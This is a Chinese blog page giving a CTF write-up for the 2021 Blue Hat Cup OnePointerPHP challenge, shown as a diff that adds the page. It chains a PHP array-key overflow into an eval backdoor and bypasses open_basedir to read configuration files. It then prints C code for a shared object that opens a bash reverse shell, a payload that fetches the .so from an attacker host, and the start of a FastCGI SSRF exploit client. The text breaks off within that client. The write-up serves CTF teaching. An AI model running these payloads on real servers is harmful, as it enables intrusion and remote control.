@@ -1,0 +1,2093 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CTF">
+    <meta name="description" content="蓝帽杯2021-OnePointerPHP">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>蓝帽杯2021-OnePointerPHP | wa0er</title>
+    <link rel="icon" type="image/png" href="/wa0er.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.0.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="wa0er" type="application/atom+xml">
+</head>
+
+
+
+
+<!-- 加载动画 -->
+
+
+<body>
+    <!-- 加载动画 -->
+    
+
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/wa0er.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">wa0er</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/wa0er.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wa0er</div>
+        <div class="logo-desc">
+            
+            Love and Share
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/wa0er" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Follow Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/wa0er" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Follow Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/article_cover/CTF.gif')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">蓝帽杯2021-OnePointerPHP</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-09-26
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-09-26
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.2k&nbsp;字
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    16 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;次
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="蓝帽杯2021-OnePointerPHP"><a href="#蓝帽杯2021-OnePointerPHP" class="headerlink" title="蓝帽杯2021-OnePointerPHP"></a>蓝帽杯2021-OnePointerPHP</h1><p>知识点概要：基础反序列化、PHP数组key溢出、<code>open_basedir</code>绕过、SSRF攻击FPM服务、被动FTP、SUID权限</p>
+<p>题目有源码，首页只有一张图</p>
+<p><code>add_api.php</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string double-quoted-string">"user.php"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+	<span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+		<span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">count</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>
+		<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+	<span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span>
+	<span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
+	<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>user.php</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">{</span>
+	<span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>对于<code>add_api.php</code>，目标是执行第九行<code>eval($_GET["backdoor"]);</code>，但是正常逻辑：</p>
+<p>第4行增加 user 对象的 count 属性值，并将自增后的值赋值给 $count 数组中的一个元素。必然会使第5行if条件为true，那么就必然执行不到第9行。（注意第5行if是赋值运算，不是比较运算）</p>
+<h2 id="PHP数组key溢出"><a href="#PHP数组key溢出" class="headerlink" title="PHP数组key溢出"></a>PHP数组key溢出</h2><p>此时就是基础的反序列化和数组key溢出的问题</p>
+<p>数组key溢出参考：<a target="_blank" rel="noopener" href="https://two.github.io/2015/09/15/PHP-array-hash-key-overflow/">https://two.github.io/2015/09/15/PHP-array-hash-key-overflow/</a></p>
+<p>可在本地用如下代码测试观察，数组key只有为<code>9223372036854775807</code>时会如下图报错（测试版本为php7.4.3），从而可以使得题目源码中if条件为flase</p>
+<blockquote>
+<p>64位操作系统int型（带符号整型）数据范围是<code>-2的63次方 ~ 2的63次方-1</code>，计算机组成原理 数据表示的知识</p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">9223372036854775807</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921111038041.png"></p>
+<p>所以序列化代码如下（因为<code>data</code>值是从COOKIE获取，所以最后需要url编码）</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">{</span>
+	<span class="token keyword">public</span> <span class="token variable">$count</span><span class="token operator">=</span><span class="token number">9223372036854775806</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//O:4:"User":1:{s:5:"count";i:9223372036854775806;}</span>
+<span class="token comment">//O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>请求包头部Cookie字段，data值传入序列化数据，同时GET传参如下（此处笔者用Hackbar完成传参）</p>
+<pre class="line-numbers language-none"><code class="language-none">/add_api.php?backdoor=phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921103348766.png"></p>
+<p>接着想用如下代码直接读flag读不到，返回false</p>
+<pre class="line-numbers language-none"><code class="language-none">?backdoor=var_dump(file_get_contents("/flag"));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h2><p>看phpinfo页面，<code>open_basedir</code>设置在<code>/var/www/html</code></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921141023229.png"></p>
+<p><code>open_basedir</code>功能及绕过参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/13210005.html">https://www.cnblogs.com/LLeaves/p/13210005.html</a></p>
+<p>四种思路：</p>
+<ul>
+<li><p>命令执行函数（如system()函数）绕过；</p>
+</li>
+<li><p>软链接（如symlink()函数）绕过；</p>
+</li>
+<li><p>glob伪协议绕过；</p>
+</li>
+<li><p>利用<code>ini_set</code>绕过。</p>
+</li>
+</ul>
+<p>但题目phpinfo中过滤了一些函数，如下图</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921141911692.png"></p>
+<p>此处利用<code>ini_set</code>绕过，构造如下payload绕过<code>open_basedir</code>列出根目录下的文件（传参时不能有注释）</p>
+<pre class="line-numbers language-none"><code class="language-none">mkdir('wa0er'); 
+chdir('wa0er');
+ini_set('open_basedir','..');
+chdir('..');	#相当于"../"
+chdir('..');
+chdir('..');
+chdir('..');
+ini_set('open_basedir','/');
+var_dump(scandir('./'));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>执行成功后，右键查看源码能让结果更加可视化</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921145256756.png"></p>
+<p>还是无法直接读flag，可能是当前用户权限不够。查看<code>php.ini</code>如下</p>
+<pre class="line-numbers language-none"><code class="language-none">mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/usr/local/etc/php/php.ini'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921145730532.png"></p>
+<p>有个<code>easy_bypass.so</code>，文件名的提示意味就很强，据说预期题解是Pwn这个so然后来获取flag。</p>
+<p>其实做到这里也想过绕过disable_functions直接RCE，我们可以通过挂载恶意so的方式来突破disable_function来实现RCE，挂载so的方法有两种：</p>
+<ul>
+<li>dl()函数挂载（dl被ban）；</li>
+<li>直接写入配置文件的extension中。</li>
+</ul>
+<p>但是这里好像都不可行，所以只能另寻思路。</p>
+<p>查看当前进程完整命令文件<code>/proc/self/cmdline</code></p>
+<pre class="line-numbers language-none"><code class="language-none">mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/proc/self/cmdline'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现<code>string(18) "php-fpm: pool www"</code>，题目环境开启了<code>php-fpm</code>服务</p>
+<p>在<code>/usr/local/etc/</code>目录下也可以看到<code>php-fpm.conf</code>等文件</p>
+<p>然后读配置文件<code>/usr/local/etc/php-fpm.d/www.conf</code>如下图（可以先<code>scandir()</code>获取目录下文件，然后<code>file_get_contents()</code>读文件）</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921151123244.png"></p>
+<p><code>php-fpm</code>服务开放在9001端口，用户是<code>www-data</code></p>
+<h2 id="SSRF攻击FPM服务"><a href="#SSRF攻击FPM服务" class="headerlink" title="SSRF攻击FPM服务"></a>SSRF攻击FPM服务</h2><p>我们可以通过SSRF来攻击FPM服务，但是受限于题目phpinfo的disable_functions，我们无法直接SSRF，但是可以利用<code>file_put_contents()</code>的一个特性来实现SSRF：</p>
+<blockquote>
+<p><code>file_put_contents</code>在使用 ftp 协议时，会将 data 的内容上传到 ftp 服务器，由于 ftp 被动模式下，服务器数据通道的地址和端口是可控，我们可以将地址和端口指到<code>127.0.0.1:9001</code>。同时由于 ftp 的特性，不会有任何的多余内容，类似<code>gopher</code>协议，会将<code>data</code>原封不动的发给<code>127.0.0.1:9001</code>，完美符合攻击 fastcgi(FPM) 的要求.</p>
+</blockquote>
+<p>首先编写一个恶意so文件来执行反弹Shell命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+__attribute__ ((__constructor__)) void preload (void){
+    system("bash -c 'bash -i &gt;&amp; /dev/tcp/[IP]/[PORT] 0&gt;&amp;1'"); #反弹Shell，修改IP端口为自己vps监听的IP端口
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>编译文件：<code>gcc 1.c -fPIC -shared -o 1.so</code>（把<code>1.c</code>编译为一个浮动地址的共享库文件<code>1.so</code>）</p>
+<p>然后上传so文件（修改IP为自己vps地址）</p>
+<pre class="line-numbers language-none"><code class="language-none">/add_api.php?backdoor=mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(copy('http://[IP]/1.so','/var/www/html/1.so'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>接下来就是想办法SSRF打FPM来挂载so文件实现RCE，可以找到一个直接攻击的脚本，注意326行是so文件路径，339行是FPM服务端口</p>
+<p>代码参考：<a target="_blank" rel="noopener" href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php">https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php</a></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/**
+ * Note : Code is released under the GNU LGPL
+ *
+ * Please do not change the header of this file
+ *
+ * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
+ * Lesser General Public License as published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
+ * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ *
+ * See the GNU Lesser General Public License for more details.
+ */</span>
+<span class="token comment">/**
+ * Handles communication with a FastCGI application
+ *
+ * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;
+ * @version     1.0
+ */</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">FCGIClient</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_CONNS'</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_REQS'</span><span class="token punctuation">;</span>
